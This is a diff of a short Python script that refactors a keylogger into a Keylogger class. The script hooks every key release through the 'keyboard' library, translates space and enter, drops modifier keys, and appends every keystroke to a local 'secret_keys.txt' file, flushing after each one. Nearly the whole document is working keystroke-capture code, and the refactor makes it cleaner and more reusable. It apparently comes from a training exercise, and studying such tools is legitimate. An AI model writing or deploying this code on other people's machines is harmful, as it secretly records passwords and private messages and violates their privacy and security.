@@ -1,18 +1,27 @@
 import keyboard
 
-our_file = open(r"C:\8200\python_files\secret_keys.txt", "w")
 
-def new_Key(Event):
-    button = Event.name
+class Keylogger:
+    def __init__(self, file_path):
+        self.file_path = file_path
+        self.f = open(file_path, "w")
 
-    if(button == "space"):
-        our_file.write(" ")
+    def start_log(self):
+        keyboard.on_release(callback=self.generate_key)
+        keyboard.wait()
 
-    else:
-        our_file.write(button)
+    def generate_key(self, event):
+        button = event.name
+        if button == "space":
+            button = " "
+        elif button == "enter":
+            button = "\n"
+        elif button in ["shift", "ctrl", "alt", "tab", "caps lock"]:
+            button = ""
+            
+        self.f.write(button)
+        self.f.flush()
 
-    our_file.flush()
 
-
-keyboard.on_release(callback=new_Key)
-keyboard.wait()
+Keylogger_instance = Keylogger(r"C:\8200\python_files\secret_keys.txt")
+Keylogger_instance.start_log()
